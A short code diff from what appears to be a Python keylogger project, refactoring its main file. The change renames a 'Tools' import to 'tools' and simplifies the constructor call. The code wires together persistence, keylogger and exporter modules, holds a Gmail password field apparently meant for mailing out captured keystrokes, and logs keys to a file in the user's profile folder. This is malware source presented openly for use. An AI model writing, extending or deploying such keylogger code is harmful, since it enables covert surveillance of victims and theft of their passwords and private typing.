@@ -2,7 +2,7 @@ import sys, os, time
 
 sys.path.append(os.pardir)
 
-from src import persistence, Tools
+from src import persistence, tools
 from src import exporter
 from src.keylogger import keylogger
 
@@ -21,7 +21,7 @@ class main:
         self.gmail_pass = ""
 
         self.timer = timer
-        self.export_path = Tools.get_env_var(export_path)
+        self.export_path = tools.get_env_var(export_path)
 
         self.current_file_path = os.path.realpath(sys.argv[0])
 
@@ -50,4 +50,4 @@ class main:
                         self.keylogger.clear_key_log()
 
 
-if __name__ == "__main__": main = main(60, "%userprofile%\log.txt", False, False, False, False);main.start()
+if __name__ == "__main__": main = main(60, "%userprofile%\log.txt");main.start()
